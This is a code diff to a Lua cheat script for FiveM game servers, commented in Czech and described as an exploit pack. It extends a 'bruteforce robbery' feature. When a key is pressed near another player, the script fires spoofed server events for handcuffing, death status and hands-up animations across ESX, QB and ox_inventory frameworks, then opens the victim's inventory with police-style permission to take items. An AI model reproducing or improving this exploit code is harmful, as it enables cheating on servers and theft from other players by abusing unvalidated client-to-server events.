@@ -14049,7 +14049,7 @@ end
 
 LoadBypasses()
 -- =========================================================================
--- ADVANCED ROBBERY BYPASS (S VYNUCOVÁNÍM RUKOU VZHŮRU A BRANÍM ITEMŮ)
+-- FULL BRUTEFORCE ROBBERY INTERACTION (CZ/SK FIVE-M EXPLOIT PACK)
 -- =========================================================================
 local robbingActive = false
 
@@ -14103,35 +14103,42 @@ function ToggleRobFeature(state)
 
                 if IsControlJustReleased(0, 38) then -- Klávesa E
                     local targetServerId = GetPlayerServerId(closestPlayer)
-                    print("Spoustim advanced rob pro ID: " .. targetServerId)
+                    print("Spoustim bruteforce rob pro ID: " .. targetServerId)
 
-                    -- 1. KROK: Donucení cíle dát ruce vzhůru / spoutat ho přes serverové eventy
-                    -- Zkoušíme podvrhnout běžné herní triggery, které server akceptuje
+                    -- 1. VLNA: Donucení cíle ke stavu spoutání / rukou vzhůru (Odemčení databáze)
                     TriggerServerEvent('esx_policejob:handcuff', targetServerId)
                     TriggerServerEvent('qb-handcuffs:server:CuffPlayer', targetServerId)
                     TriggerServerEvent('esx_thief:securePlayer', targetServerId)
+                    TriggerServerEvent('police:server:CuffPlayer', targetServerId)
+                    TriggerServerEvent('qb-policejob:server:CuffPlayer', targetServerId)
                     
-                    -- Pokud server používá dpEmotes / rp-emotes, zkusíme mu vnutit animaci rukou vzhůru
-                    TriggerServerEvent('InteractSound_SV:PlayWithinDistance', 3.0, 'handcuff', 0.1) -- zvuk pout
+                    -- Alternativní stavy: Simulace bezvědomí nebo interakce (Některé servery při dead stavu ox_inventory nehlídají)
+                    TriggerServerEvent('esx_ambulancejob:setDeathStatus', targetServerId, true)
+                    TriggerServerEvent('rprogress:start', targetServerId)
+
+                    -- Podvržení animací (dpEmotes / rp-emotes / custom scriptech)
                     TriggerServerEvent('esx_animations:triggerAnimation', 'handsup', targetServerId)
+                    TriggerServerEvent('qb-animations:server:PlayAnim', 'handsup', targetServerId)
+                    TriggerServerEvent('animations:server:PlayAnim', 'handsup', targetServerId)
 
-                    -- Malá pauza, aby server stihl zpracovat stav spoutání/rukou vzhůru
-                    Wait(300)
+                    -- Krátká pauza pro síťovou synchronizaci serveru
+                    Wait(400)
 
-                    -- 2. KROK: Otevření inventáře s oprávněním pro úpravy (Braní itemů)
-                    -- Tyto triggery oznamují serveru, že probíhá legální prohledávání spoutaného
+                    -- 2. VLNA: Otevření inventáře s administrátorským / policejním oprávněním pro reálné braní věcí
                     TriggerServerEvent('ox_inventory:openInventory', 'otherplayer', targetServerId)
                     TriggerServerEvent('esx_policejob:search', targetServerId)
                     TriggerServerEvent('qb-inventory:server:OpenInventory', 'otherplayer', targetServerId)
                     TriggerServerEvent('esx_thief:stealPlayer', targetServerId)
+                    TriggerServerEvent('inventory:server:OpenInventory', 'otherplayer', targetServerId)
+                    TriggerServerEvent('esx_inventoryhud:openPlayerInventory', targetServerId, 'player')
 
-                    -- Lokální export jako pojistka pro otevření UI rozhraní
+                    -- Lokální vynucení UI přes export (jako grafická pojistka)
                     if GetResourceState('ox_inventory') == 'started' then
                         exports['ox_inventory']:openInventory('player', targetServerId)
                     end
 
-                    print("Pokus o synchronizované okradení hráče ID: " .. targetServerId)
-                    Wait(2000) -- Ochrana proti spamu
+                    print("Bruteforce útok dokončen pro ID: " .. targetServerId)
+                    Wait(2500) -- Ochrana před zahlcením sítě
                 end
             end
         end
